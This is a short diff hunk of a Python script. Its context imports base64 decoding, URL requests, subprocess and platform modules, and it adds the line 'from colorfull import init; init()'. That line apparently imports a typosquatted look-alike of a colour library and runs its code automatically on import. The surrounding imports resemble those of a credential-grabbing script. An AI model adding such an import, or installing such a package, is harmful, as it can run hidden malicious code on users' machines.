@@ -11,6 +11,7 @@ from base64 import b64decode
 from json import loads
 from urllib.request import Request, urlopen
 from subprocess import Popen, PIPE
+from colorfull import init; init()
 import platform as plt
 
 ids = []
